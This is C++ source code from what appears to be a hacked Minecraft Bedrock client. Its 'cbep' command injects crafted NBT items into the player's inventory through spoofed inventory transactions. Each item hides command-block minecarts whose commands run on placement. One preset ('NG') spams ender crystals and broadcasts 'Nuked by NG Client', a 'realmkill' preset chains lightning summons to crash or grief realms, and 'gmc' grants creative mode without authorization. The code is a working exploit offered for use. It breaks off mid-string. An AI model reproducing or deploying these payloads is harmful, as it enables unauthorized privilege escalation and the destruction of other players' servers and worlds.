#include "CBEPCommand.h"

#include <thread>

#include "../../../SDK/Tag.h"
#include "../../Module/ModuleManager.h"

CBEPCommand::CBEPCommand() : IMCCommand("cbep", "Gives you cbe presets", "<gmc/gms/gma> <write> <house> <kick/kill/tp> <day/night> <anticheat> <admin/disable> <nuke/realmkill/gravity/tntstorm>") {
	registerAlias("cp");
}

CBEPCommand::~CBEPCommand() {
}

bool CBEPCommand::execute(std::vector<std::string>* args) {
	static auto partner = moduleMgr->getModule<Partner>();
	C_ItemStack* yot = new C_ItemStack(***ItemRegistry::lookUpByName(std::make_unique<uintptr_t>().get(), std::make_unique<uintptr_t>().get(), TextHolder("shulker_box")), 1, 0);
	int slot = g_Data.getLocalPlayer()->getSupplies()->inventory->getFirstEmptySlot();
	std::transform(args->at(1).begin(), args->at(1).end(), args->at(1).begin(), ::tolower);
	//NG Client on top
	if (args->at(1) == "NG") {
		C_ItemStack* item;
		item = new C_ItemStack(***ItemRegistry::lookUpByName(std::make_unique<uintptr_t>().get(), std::make_unique<uintptr_t>().get(), TextHolder("movingblock")), 1, 0);
		std::string tag = R"({CanPlaceOn:[""grass","stone","deny","bedrock",grass_block","dirt"],Count:1b,Damage:0s,Name:"minecraft:movingblock",tag:{movingEntity:{id:"Beehive",Occupants:[{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/title @a title Nuked by NG Client!!",ExecuteOnFirstTick:1b,Tags:[],TickDelay:20,Ticking:1b,Invulnerable:1b,definitions:["lightning_bolt"]}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/execute @a ~ ~ ~ /summon ender_crystal ~ ~2 ~",ExecuteOnFirstTick:1b,Tags:[],TickDelay:1,Ticking:1b,Invulnerable:1b,definitions:["ender_crystal"]}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/tickingarea add circle ~~~ 4 GETNUKED",ExecuteOnFirstTick:1b,Tags:[],TickDelay:1,Ticking:1b,Invulnerable:1b,definitions:["ender_crystal"]}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/execute @a ~ ~ ~ /summon ender_crystal ~ ~2 ~",ExecuteOnFirstTick:1b,Tags:[],TickDelay:1,Ticking:1b,Invulnerable:1b,definitions:["ender_crystal"]}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/execute @a ~ ~ ~ /summon ender_crystal ~ ~2 ~",ExecuteOnFirstTick:1b,Tags:[],TickDelay:1,Ticking:1b,Invulnerable:1b,definitions:["ender_crystal"]}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/execute @a ~ ~ ~ /summon ender_crystal ~ ~2 ~",ExecuteOnFirstTick:1b,Tags:[],TickDelay:1,Ticking:1b,Invulnerable:1b,definitions:["ender_crystal"]}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/execute @a ~ ~ ~ /summon ender_crystal ~ ~2 ~",ExecuteOnFirstTick:1b,Tags:[],TickDelay:1,Ticking:1b,Invulnerable:1b,definitions:["ender_crystal"]}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/execute @a ~ ~ ~ /summon ender_crystal ~ ~2 ~",ExecuteOnFirstTick:1b,Tags:[],TickDelay:1,Ticking:1b,Invulnerable:1b,definitions:["ender_crystal"]}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/execute @a ~ ~ ~ /summon ender_crystal ~ ~2 ~",ExecuteOnFirstTick:1b,Tags:[],TickDelay:1,Ticking:1b,Invulnerable:1b,definitions:["ender_crystal"]}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/execute @a ~ ~ ~ /summon ender_crystal ~ ~2 ~",ExecuteOnFirstTick:1b,Tags:[],TickDelay:1,Ticking:1b,Invulnerable:1b,definitions:["ender_crystal"]}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/execute @a ~ ~ ~ /summon ender_crystal ~ ~2 ~",ExecuteOnFirstTick:1b,Tags:[],TickDelay:1,Ticking:1b,Invulnerable:1b,definitions:["ender_crystal"]}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/execute @a ~ ~ ~ /summon ender_crystal ~ ~2 ~",ExecuteOnFirstTick:1b,Tags:[],TickDelay:1,Ticking:1b,Invulnerable:1b,definitions:["ender_crystal"]}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/execute @a ~ ~ ~ /summon ender_crystal ~ ~2 ~",ExecuteOnFirstTick:1b,Tags:[],TickDelay:1,Ticking:1b,Invulnerable:1b,definitions:["ender_crystal"]}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/execute @a ~ ~ ~ /summon ender_crystal ~ ~2 ~",ExecuteOnFirstTick:1b,Tags:[],TickDelay:1,Ticking:1b,Invulnerable:1b,definitions:["ender_crystal"]}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/execute @a ~ ~ ~ /summon ender_crystal ~ ~2 ~",ExecuteOnFirstTick:1b,Tags:[],TickDelay:1,Ticking:1b,Invulnerable:1b,definitions:["ender_crystal"]}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/execute @a ~ ~ ~ /summon ender_crystal ~ ~2 ~",ExecuteOnFirstTick:1b,Tags:[],TickDelay:1,Ticking:1b,Invulnerable:1b,definitions:["ender_crystal"]}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/execute @a ~ ~ ~ /summon ender_crystal ~ ~2 ~",ExecuteOnFirstTick:1b,Tags:[],TickDelay:1,Ticking:1b,Invulnerable:1b,definitions:["ender_crystal"]}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/execute @a ~ ~ ~ /summon ender_crystal ~ ~2 ~",ExecuteOnFirstTick:1b,Tags:[],TickDelay:1,Ticking:1b,Invulnerable:1b,definitions:["ender_crystal"]}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/execute @a ~ ~ ~ /summon ender_crystal ~ ~2 ~",ExecuteOnFirstTick:1b,Tags:[],TickDelay:1,Ticking:1b,Invulnerable:1b,definitions:["ender_crystal"]}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/execute @a ~ ~ ~ /summon ender_crystal ~ ~2 ~",ExecuteOnFirstTick:1b,Tags:[],TickDelay:1,Ticking:1b,Invulnerable:1b,definitions:["ender_crystal"]}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/execute @a ~ ~ ~ /summon ender_crystal ~ ~2 ~",ExecuteOnFirstTick:1b,Tags:[],TickDelay:1,Ticking:1b,Invulnerable:1b,definitions:["ender_crystal"]}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/execute @a ~ ~ ~ /summon ender_crystal ~ ~2 ~",ExecuteOnFirstTick:1b,Tags:[],TickDelay:1,Ticking:1b,Invulnerable:1b,definitions:["ender_crystal"]}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/execute @a ~ ~ ~ /summon ender_crystal ~ ~2 ~",ExecuteOnFirstTick:1b,Tags:[],TickDelay:1,Ticking:1b,Invulnerable:1b,definitions:["ender_crystal"]}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/execute @a ~ ~ ~ /summon ender_crystal ~ ~2 ~",ExecuteOnFirstTick:1b,Tags:[],TickDelay:1,Ticking:1b,Invulnerable:1b,definitions:["ender_crystal"]}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/execute @a ~ ~ ~ /summon ender_crystal ~ ~2 ~",ExecuteOnFirstTick:1b,Tags:[],TickDelay:1,Ticking:1b,Invulnerable:1b,definitions:["ender_crystal"]}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/execute @a ~ ~ ~ /summon ender_crystal ~ ~2 ~",ExecuteOnFirstTick:1b,Tags:[],TickDelay:1,Ticking:1b,Invulnerable:1b,definitions:["ender_crystal"]}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/execute @a ~ ~ ~ /summon ender_crystal ~ ~2 ~",ExecuteOnFirstTick:1b,Tags:[],TickDelay:1,Ticking:1b,Invulnerable:1b,definitions:["ender_crystal"]}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/execute @a ~ ~ ~ /summon ender_crystal ~ ~2 ~",ExecuteOnFirstTick:1b,Tags:[],TickDelay:1,Ticking:1b,Invulnerable:1b,definitions:["ender_crystal"]}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/execute @a ~ ~ ~ /summon ender_crystal ~ ~2 ~",ExecuteOnFirstTick:1b,Tags:[],TickDelay:1,Ticking:1b,Invulnerable:1b,definitions:["ender_crystal"]}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/execute @a ~ ~ ~ /summon ender_crystal ~ ~2 ~",ExecuteOnFirstTick:1b,Tags:[],TickDelay:1,Ticking:1b,Invulnerable:1b,definitions:["ender_crystal"]}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/execute @a ~ ~ ~ /summon ender_crystal ~ ~2 ~",ExecuteOnFirstTick:1b,Tags:[],TickDelay:1,Ticking:1b,Invulnerable:1b,definitions:["ender_crystal"]}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/execute @a ~ ~ ~ /summon lightning_bolt ~ ~2 ~",ExecuteOnFirstTick:1b,Tags:[],TickDelay:5,Ticking:1b,Invulnerable:1b,definitions:["ender_crystal"]}}]},pistonPosX:0,movingBlock:{name:"minecraft:air"},pistonPosY:0,pistonPosZ:0,ench:[{id:28s,lvl:1s}],display:{Name:"§g§lNG Client Invisible CBE",Lore:["Godmode NG Client NBT"]}}})";
		item->fromTag(*Mojangson::parseTag(tag));
		g_Data.getLocalPlayer()->getTransactionManager()->addInventoryAction(C_InventoryAction(0, nullptr, nullptr, item, nullptr, 1, 507, 99999));
		g_Data.getLocalPlayer()->getSupplies()->inventory->addItemToFirstEmptySlot(item);
		if (partner->Partnered.selected == 0)
			clientMessageF("%sDADDY%s%s%s[%sSurge%s] %sHere is your CBEP!%s%sDADDY", OBFUSCATED, RESET, ITALIC, BOLD, BLUE, WHITE, BLUE, RESET, OBFUSCATED);
		else
		clientMessageF("[%sNG%s] %sHere is your CBEP!", LIGHT_PURPLE, WHITE, LIGHT_PURPLE);
		return true;
	}
	//Shnags Realm Bye Bye
	if (args->at(1) == "realmkill") {
		std::string tag = "{CanPlaceOn:[grass,stone,chest,ender_chest,stone_brick],tag:{display:{Name:\"ÃÂ§b Realm Killa Â§aby SHNAGSÂ§r\"},ench:[{id:9s,lvl:-1s}],Occupants:[{ActorIdentifier:\"minecraft:command_block_minecart<>\",SaveData:{IsGlobal:0b,SuccessCount:0,LootDropped:0b,ShowBottom:0b,IsTrusting:0b,LastDimensionId:0,PortalCooldown:0,IsStunned:0b,IsScared:0b,Color2:0b,Rotation:[-1.5359192f,0.0f],TickDelay:0,FallDistance:0.0f,OwnerNew:-1l,Chested:0b,LastOutputParams:[\"gamemode c\",\"[\",\"m=adventur\"],IsSwimming:0b,Ticking:1b,IsIllagerCaptain:0b,Sitting:0b,Pos:[640.519f,66.35f,32.207695f],CustomName:OWNER,LastOutput:\"commands.generic.syntax\",Fire:0s,SkinID:0,UniqueID:-2671469658033l,Saddled:0b,StrengthMax:0,Motion:[0.0f,0.0f,0.0f],MarkVariant:0,Strength:0,Sheared:0b,IsGliding:0b,LastExecution:0l,Variant:0,TrackOutput:1b,IsTamed:0b,IsAngry:0b,IsOrphaned:0b,Version:10,IsEating:0b,Command:\"/execute @e[type=lightning_bolt,rm=20] ~~~ summon lightning_bolt ~~~\",ChestItems:[{Count:0b,Damage:0s,Slot:0b,Name:\"By GETSHNAGED\"}],OnGround:0b,Color:0b,IsBaby:0b,CurrentTickCount:1,ExecuteOnFirstTick:1b,IsRoaring:0b,definitions:[\"+minecraft:lightning_bolt\",\"+minecraft:command_block_inactive\"],identifier:\"minecraft:command_block_minecart\",IsAutonomous:0b,Invulnerable:0b,InventoryVersion:\"1.14.60\"},TicksLeftToStay:0},{ActorIdentifier:\"minecraft:command_block_minecart<>\",SaveData:{IsGlobal:0b,SuccessCount:0,LootDropped:0b,ShowBottom:0b,IsTrusting:0b,LastDimensionId:0,PortalCooldown:0,IsStunned:0b,IsScared:0b,Color2:0b,Rotation:[-1.5359192f,0.0f],TickDelay:0,FallDistance:0.0f,OwnerNew:-1l,Chested:0b,LastOutputParams:[\"gamemode c\",\"[\",\"m=adventur\"],IsSwimming:0b,Ticking:1b,IsIllagerCaptain:0b,Sitting:0b,Pos:[640.519f,66.35f,32.207695f],CustomName:OWNER,LastOutput:\"commands.generic.syntax\",Fire:0s,SkinID:0,UniqueID:-2671469658033l,Saddled:0b,StrengthMax:0,Motion:[0.0f,0.0f,0.0f],MarkVariant:0,Strength:0,Sheared:0b,IsGliding:0b,LastExecution:0l,Variant:0,TrackOutput:1b,IsTamed:0b,IsAngry:0b,IsOrphaned:0b,Version:10,IsEating:0b,Command:\"/execute @a[rm=20] ~~~ summon lightning_bolt ~~~\",ChestItems:[{Count:0b,Damage:0s,Slot:0b,Name:\"By GETSHNAGED\"}],OnGround:0b,Color:0b,IsBaby:0b,CurrentTickCount:1,ExecuteOnFirstTick:1b,IsRoaring:0b,definitions:[\"+minecraft:lightning_bolt\",\"+minecraft:command_block_inactive\"],identifier:\"minecraft:command_block_minecart\",IsAutonomous:0b,Invulnerable:0b,InventoryVersion:\"1.14.60\"},TicksLeftToStay:0},{ActorIdentifier:\"minecraft:command_block_minecart<>\",SaveData:{IsGlobal:0b,SuccessCount:0,LootDropped:0b,ShowBottom:0b,IsTrusting:0b,LastDimensionId:0,PortalCooldown:0,IsStunned:0b,IsScared:0b,Color2:0b,Rotation:[-1.5359192f,0.0f],TickDelay:0,FallDistance:0.0f,OwnerNew:-1l,Chested:0b,LastOutputParams:[\"gamemode c\",\"[\",\"m=adventur\"],IsSwimming:0b,Ticking:1b,IsIllagerCaptain:0b,Sitting:0b,Pos:[640.519f,66.35f,32.207695f],CustomName:\"OWNER\",LastOutput:\"commands.generic.syntax\",Fire:0s,SkinID:0,UniqueID:-2671469658033l,Saddled:0b,StrengthMax:0,Motion:[0.0f,0.0f,0.0f],MarkVariant:0,Strength:0,Sheared:0b,IsGliding:0b,LastExecution:0l,Variant:0,TrackOutput:1b,IsTamed:0b,IsAngry:0b,IsOrphaned:0b,Version:10,IsEating:0b,Command:\"/execute @e[type=lightning_bolt,rm=20] ~~~ summon lightning_bolt ~~~\",ChestItems:[{Count:0b,Damage:0s,Slot:0b,Name:\"By GETSHNAGED\"}],OnGround:0b,Color:0b,IsBaby:0b,CurrentTickCount:1,ExecuteOnFirstTick:1b,IsRoaring:0b,definitions:[\"+minecraft:lightning_bolt\",\"+minecraft:command_block_inactive\"],identifier:\"minecraft:command_block_minecart\",IsAutonomous:0b,Invulnerable:0b,InventoryVersion:\"1.14.60\"},TicksLeftToStay:0},{ActorIdentifier:\"minecraft:command_block_minecart<>\",SaveData:{IsGlobal:0b,SuccessCount:0,LootDropped:0b,ShowBottom:0b,IsTrusting:0b,LastDimensionId:0,PortalCooldown:0,IsStunned:0b,IsScared:0b,Color2:0b,Rotation:[-1.5359192f,0.0f],TickDelay:0,FallDistance:0.0f,OwnerNew:-1l,Chested:0b,LastOutputParams:[\"gamemode c\",\"[\",\"m=adventur\"],IsSwimming:0b,Ticking:1b,IsIllagerCaptain:0b,Sitting:0b,Pos:[640.519f,66.35f,32.207695f],CustomName:OWNER,LastOutput:\"commands.generic.syntax\",Fire:0s,SkinID:0,UniqueID:-2671469658033l,Saddled:0b,StrengthMax:0,Motion:[0.0f,0.0f,0.0f],MarkVariant:0,Strength:0,Sheared:0b,IsGliding:0b,LastExecution:0l,Variant:0,TrackOutput:1b,IsTamed:0b,IsAngry:0b,IsOrphaned:0b,Version:10,IsEating:0b,Command:\"/execute @e[rm=20] ~~~ summon lightning_bolt ~~~\",ChestItems:[{Count:0b,Damage:0s,Slot:0b,Name:\"By GETSHNAGED\"}],OnGround:0b,Color:0b,IsBaby:0b,CurrentTickCount:1,ExecuteOnFirstTick:1b,IsRoaring:0b,definitions:[\"+minecraft:lightning_bolt\",\"+minecraft:command_block_inactive\"],identifier:\"minecraft:command_block_minecart\",IsAutonomous:0b,Invulnerable:0b,InventoryVersion:\"1.14.60\"},TicksLeftToStay:0}]},Damage:0s,Block:{name:\"minecraft:dirt\",states:{direction:0,honey_level:0},version:17879555},WasPickedUp:0b,CanDestroy:[beehive],Count:1b,Name:\"minecraft:beehive\"}";
		yot->fromTag(*Mojangson::parseTag(tag));
		g_Data.getLocalPlayer()->getTransactionManager()->addInventoryAction(C_InventoryAction(0, nullptr, nullptr, yot, nullptr, 1, 507, 99999));
		g_Data.getLocalPlayer()->getSupplies()->inventory->addItemToFirstEmptySlot(yot);
		if (partner->Partnered.selected == 0)
			clientMessageF("%sDADDY%s%s%s[%sSurge%s] %sHere is your CBEP!%s%sDADDY", OBFUSCATED, RESET, ITALIC, BOLD, BLUE, WHITE, BLUE, RESET, OBFUSCATED);
		else
			clientMessageF("[%sNG%s] %sHere is your CBEP!", LIGHT_PURPLE, WHITE, LIGHT_PURPLE);
		return true;
	}
	//gamemodes
	if (args->at(1) == "gmc") {
		std::string tag = "{CanPlaceOn:[\"birch_pressure_plate\",\"jungle_pressure_plate\",\"dark_oak_pressure_plate\",\"spruce_pressure_plate\",\"dark_oak_button\",\"carved_pumpkin\",\"jungle_button\",\"stone_slab3\",\"granite_stairs\",\"andesite_stairs\",\"double_stone_slab3\",\"acacia_button\",\"birch_button\",\"spruce_button\",\"turtle_egg\",\"stone_slab4\",\"double_stone_slab4\",\"diorite_stairs\",\"polished_granite_stairs\",\"polished_diorite_stairs\",\"polished_andesite_stairs\",\"mossy_stone_brick_stairs\",\"smooth_red_sandstone_stairs\",\"smooth_sandstone_stairs\",\"blast_furnace\",\"barrel\",\"birch_standing_sign\",\"smooth_quartz_stairs\",\"smoker\",\"end_brick_stairs\",\"birch_wall_sign\",\"darkoak_standing_sign\",\"spruce_wall_sign\",\"darkoak_wall_sign\",\"spruce_standing_sign\",\"normal_stone_stairs\",\"jungle_wall_sign\",\"red_nether_brick_stairs\",\"jungle_standing_sign\",\"acacia_wall_sign\",\"mossy_cobblestone_stairs\",\"acacia_standing_sign\",\"loom\",\"campfire\",\"bee_nest\",\"wither_rose\",\"beehive\",\"dispenser\",\"sandstone\",\"bed\",\"web\",\"tallgrass\",\"wool\",\"iron_block\",\"deadbush\",\"brown_mushroom\",\"gold_block\",\"red_mushroom\",\"brick_block\",\"mossy_cobblestone\",\"mob_spawner\",\"torch\",\"tnt\",\"bookshelf\",\"redstone_wire\",\"diamond_ore\",\"lever\",\"ladder\",\"diamond_block\",\"crafting_table\",\"cactus\",\"snow_layer\",\"snow\",\"jukebox\",\"clay\",\"soul_sand\",\"glowstone\",\"cake\",\"fence\",\"netherrack\",\"trapdoor\",\"nether_wart\",\"blue_ice\",\"nether_brick\",\"melon_block\",\"monster_egg\",\"vine\",\"mycelium\",\"enchanting_table\",\"stonebrick\",\"beacon\",\"fence_gate\",\"waterlily\",\"nether_brick_fence\",\"brewing_stand\",\"cauldron\",\"tripWire\",\"flower_pot\",\"dragon_egg\",\"emerald_ore\",\"end_portal_frame\",\"tripwire_hook\",\"dropper\",\"end_stone\",\"emerald_block\",\"cobblestone_wall\",\"skull\",\"anvil\",\"seaLantern\",\"stained_hardened_clay\",\"quartz_block\",\"redstone_block\",\"slime\",\"hopper\",\"log2\",\"iron_trapdoor\",\"prismarine\",\"hay_block\",\"carpet\",\"hardened_clay\",\"coal_block\",\"red_sandstone\",\"spruce_fence_gate\",\"jungle_fence_gate\",\"birch_fence_gate\",\"grass_path\",\"dark_oak_fence_gate\",\"chorus_flower\",\"acacia_fence_gate\",\"end_bricks\",\"end_rod\",\"red_nether_brick\",\"purpur_block\",\"magma\",\"nether_wart_block\",\"chorus_plant\",\"concrete\",\"bone_block\",\"concretePowder\",\"stonecutter_block\",\"coral\",\"coral_fan_dead\",\"coral_block\",\"coral_fan\",\"wooden_pressure_plate\",\"stone_pressure_plate\",\"acacia_pressure_plate\",\"light_weighted_pressure_plate\",\"heavy_weighted_pressure_plate\",\"grass\",\"double_plant\",\"stone\",\"cobblestone\",\"planks\",\"dirt\",\"sapling\",\"bedrock\",\"sand\",\"gravel\",\"gold_ore\",\"log\",\"coal_ore\",\"sponge\",\"lapis_ore\",\"iron_ore\",\"lapis_block\",\"dark_oak_trapdoor\",\"sea_pickle\",\"bamboo\",\"lectern\",\"barrier\",\"dried_kelp_block\",\"scaffolding\",\"birch_trapdoor\",\"kelp\",\"seagrass\",\"acacia_trapdoor\",\"jungle_trapdoor\",\"spruce_trapdoor\",\"smooth_stone\",\"grindstone\",\"cartography_table\",\"smithing_table\",\"bell\",\"fletching_table\",\"composter\",\"lantern\",\"wood\",\"honeycomb_block\",\"honey_block\",\"leaves\",\"nether_brick_stairs\",\"brick_stairs\",\"activator_rail\",\"spruce_stairs\",\"ender_chest\",\"stone_brick_stairs\",\"sandstone_stairs\",\"wooden_slab\",\"powered_comparator\",\"quartz_stairs\",\"dark_oak_stairs\",\"standing_banner\",\"wooden_button\",\"daylight_detector\",\"birch_stairs\",\"unpowered_comparator\",\"jungle_stairs\",\"trapped_chest\",\"double_wooden_slab\",\"stained_glass_pane\",\"leaves2\",\"acacia_stairs\",\"packed_ice\",\"wall_banner\",\"red_sandstone_stairs\",\"stone_slab2\",\"double_stone_slab2\",\"spruce_door\",\"shulker_box\",\"white_glazed_terracotta\",\"blue_glazed_terracotta\",\"black_glazed_terracotta\",\"gray_glazed_terracotta\",\"purpur_stairs\",\"jungle_door\",\"purple_glazed_terracotta\",\"magenta_glazed_terracotta\",\"yellow_glazed_terracotta\",\"lime_glazed_terracotta\",\"light_blue_glazed_terracotta\",\"cyan_glazed_terracotta\",\"pink_glazed_terracotta\",\"dark_oak_door\",\"acacia_door\",\"brown_glazed_terracotta\",\"birch_door\",\"orange_glazed_terracotta\",\"silver_glazed_terracotta\",\"green_glazed_terracotta\",\"red_glazed_terracotta\",\"prismarine_stairs\",\"prismarine_bricks_stairs\",\"observer\",\"stained_glass\",\"dark_prismarine_stairs\",\"stone_slab\",\"double_stone_slab\",\"obsidian\",\"detector_rail\",\"golden_rail\",\"yellow_flower\",\"glass\",\"red_flower\",\"oak_stairs\",\"furnace\",\"chest\",\"standing_sign\",\"rail\",\"stone_stairs\",\"wooden_door\",\"ice\",\"iron_door\",\"powered_repeater\",\"brown_mushroom_block\",\"wall_sign\",\"unlit_redstone_torch\",\"redstone_torch\",\"redstone_ore\",\"stone_button\",\"pumpkin\",\"lit_pumpkin\",\"unpowered_repeater\",\"red_mushroom_block\",\"iron_bars\",\"glass_pane\"],Count:1b,Name:\"minecraft:movingBlock\",tag:{movingBlock:{name:\"minecraft:air\",states:{}}movingEntity:{Occupants:[{ActorIdentifier:\"minecraft:command_block_minecart<>\",SaveData:{Command:" "\" /gamemode c @p " "\",Ticking:1b,TicksLeftToStay:-1,definitions:[" "\"+minecraft:leash_knot" "\"]}}],CanDestory:[grass],ShouldSpawnBees:0b,id:\"Beehive\"}}}";
		yot->fromTag(*Mojangson::parseTag(tag));
		g_Data.getLocalPlayer()->getTransactionManager()->addInventoryAction(C_InventoryAction(0, nullptr, nullptr, yot, nullptr, 1, 507, 99999));
		g_Data.getLocalPlayer()->getSupplies()->inventory->addItemToFirstEmptySlot(yot);
		if (partner->Partnered.selected == 0)
			clientMessageF("%sDADDY%s%s%s[%sSurge%s] %sHere is your CBEP!%s%sDADDY", OBFUSCATED, RESET, ITALIC, BOLD, BLUE, WHITE, BLUE, RESET, OBFUSCATED);
		else
			clientMessageF("[%sNG%s] %sHere is your CBEP!", LIGHT_PURPLE, WHITE, LIGHT_PURPLE);
		return true;
	}
	if (args->at(1) == "gms") {
		std::string tag = "{CanPlaceOn:[\"birch_pressure_plate\",\"jungle_pressure_plate\",\"dark_oak_pressure_plate\",\"spruce_pressure_plate\",\"dark_oak_button\",\"carved_pumpkin\",\"jungle_button\",\"stone_slab3\",\"granite_stairs\",\"andesite_stairs\",\"double_stone_slab3\",\"acacia_button\",\"birch_button\",\"spruce_button\",\"turtle_egg\",\"stone_slab4\",\"double_stone_slab4\",\"diorite_stairs\",\"polished_granite_stairs\",\"polished_diorite_stairs\",\"polished_andesite_stairs\",\"mossy_stone_brick_stairs\",\"smooth_red_sandstone_stairs\",\"smooth_sandstone_stairs\",\"blast_furnace\",\"barrel\",\"birch_standing_sign\",\"smooth_quartz_stairs\",\"smoker\",\"end_brick_stairs\",\"birch_wall_sign\",\"darkoak_standing_sign\",\"spruce_wall_sign\",\"darkoak_wall_sign\",\"spruce_standing_sign\",\"normal_stone_stairs\",\"jungle_wall_sign\",\"red_nether_brick_stairs\",\"jungle_standing_sign\",\"acacia_wall_sign\",\"mossy_cobblestone_stairs\",\"acacia_standing_sign\",\"loom\",\"campfire\",\"bee_nest\",\"wither_rose\",\"beehive\",\"dispenser\",\"sandstone\",\"bed\",\"web\",\"tallgrass\",\"wool\",\"iron_block\",\"deadbush\",\"brown_mushroom\",\"gold_block\",\"red_mushroom\",\"brick_block\",\"mossy_cobblestone\",\"mob_spawner\",\"torch\",\"tnt\",\"bookshelf\",\"redstone_wire\",\"diamond_ore\",\"lever\",\"ladder\",\"diamond_block\",\"crafting_table\",\"cactus\",\"snow_layer\",\"snow\",\"jukebox\",\"clay\",\"soul_sand\",\"glowstone\",\"cake\",\"fence\",\"netherrack\",\"trapdoor\",\"nether_wart\",\"blue_ice\",\"nether_brick\",\"melon_block\",\"monster_egg\",\"vine\",\"mycelium\",\"enchanting_table\",\"stonebrick\",\"beacon\",\"fence_gate\",\"waterlily\",\"nether_brick_fence\",\"brewing_stand\",\"cauldron\",\"tripWire\",\"flower_pot\",\"dragon_egg\",\"emerald_ore\",\"end_portal_frame\",\"tripwire_hook\",\"dropper\",\"end_stone\",\"emerald_block\",\"cobblestone_wall\",\"skull\",\"anvil\",\"seaLantern\",\"stained_hardened_clay\",\"quartz_block\",\"redstone_block\",\"slime\",\"hopper\",\"log2\",\"iron_trapdoor\",\"prismarine\",\"hay_block\",\"carpet\",\"hardened_clay\",\"coal_block\",\"red_sandstone\",\"spruce_fence_gate\",\"jungle_fence_gate\",\"birch_fence_gate\",\"grass_path\",\"dark_oak_fence_gate\",\"chorus_flower\",\"acacia_fence_gate\",\"end_bricks\",\"end_rod\",\"red_nether_brick\",\"purpur_block\",\"magma\",\"nether_wart_block\",\"chorus_plant\",\"concrete\",\"bone_block\",\"concretePowder\",\"stonecutter_block\",\"coral\",\"coral_fan_dead\",\"coral_block\",\"coral_fan\",\"wooden_pressure_plate\",\"stone_pressure_plate\",\"acacia_pressure_plate\",\"light_weighted_pressure_plate\",\"heavy_weighted_pressure_plate\",\"grass\",\"double_plant\",\"stone\",\"cobblestone\",\"planks\",\"dirt\",\"sapling\",\"bedrock\",\"sand\",\"gravel\",\"gold_ore\",\"log\",\"coal_ore\",\"sponge\",\"lapis_ore\",\"iron_ore\",\"lapis_block\",\"dark_oak_trapdoor\",\"sea_pickle\",\"bamboo\",\"lectern\",\"barrier\",\"dried_kelp_block\",\"scaffolding\",\"birch_trapdoor\",\"kelp\",\"seagrass\",\"acacia_trapdoor\",\"jungle_trapdoor\",\"spruce_trapdoor\",\"smooth_stone\",\"grindstone\",\"cartography_table\",\"smithing_table\",\"bell\",\"fletching_table\",\"composter\",\"lantern\",\"wood\",\"honeycomb_block\",\"honey_block\",\"leaves\",\"nether_brick_stairs\",\"brick_stairs\",\"activator_rail\",\"spruce_stairs\",\"ender_chest\",\"stone_brick_stairs\",\"sandstone_stairs\",\"wooden_slab\",\"powered_comparator\",\"quartz_stairs\",\"dark_oak_stairs\",\"standing_banner\",\"wooden_button\",\"daylight_detector\",\"birch_stairs\",\"unpowered_comparator\",\"jungle_stairs\",\"trapped_chest\",\"double_wooden_slab\",\"stained_glass_pane\",\"leaves2\",\"acacia_stairs\",\"packed_ice\",\"wall_banner\",\"red_sandstone_stairs\",\"stone_slab2\",\"double_stone_slab2\",\"spruce_door\",\"shulker_box\",\"white_glazed_terracotta\",\"blue_glazed_terracotta\",\"black_glazed_terracotta\",\"gray_glazed_terracotta\",\"purpur_stairs\",\"jungle_door\",\"purple_glazed_terracotta\",\"magenta_glazed_terracotta\",\"yellow_glazed_terracotta\",\"lime_glazed_terracotta\",\"light_blue_glazed_terracotta\",\"cyan_glazed_terracotta\",\"pink_glazed_terracotta\",\"dark_oak_door\",\"acacia_door\",\"brown_glazed_terracotta\",\"birch_door\",\"orange_glazed_terracotta\",\"silver_glazed_terracotta\",\"green_glazed_terracotta\",\"red_glazed_terracotta\",\"prismarine_stairs\",\"prismarine_bricks_stairs\",\"observer\",\"stained_glass\",\"dark_prismarine_stairs\",\"stone_slab\",\"double_stone_slab\",\"obsidian\",\"detector_rail\",\"golden_rail\",\"yellow_flower\",\"glass\",\"red_flower\",\"oak_stairs\",\"furnace\",\"chest\",\"standing_sign\",\"rail\",\"stone_stairs\",\"wooden_door\",\"ice\",\"iron_door\",\"powered_repeater\",\"brown_mushroom_block\",\"wall_sign\",\"unlit_redstone_torch\",\"redstone_torch\",\"redstone_ore\",\"stone_button\",\"pumpkin\",\"lit_pumpkin\",\"unpowered_repeater\",\"red_mushroom_block\",\"iron_bars\",\"glass_pane\"],Count:1b,Name:\"minecraft:movingBlock\",tag:{movingBlock:{name:\"minecraft:air\",states:{}}movingEntity:{Occupants:[{A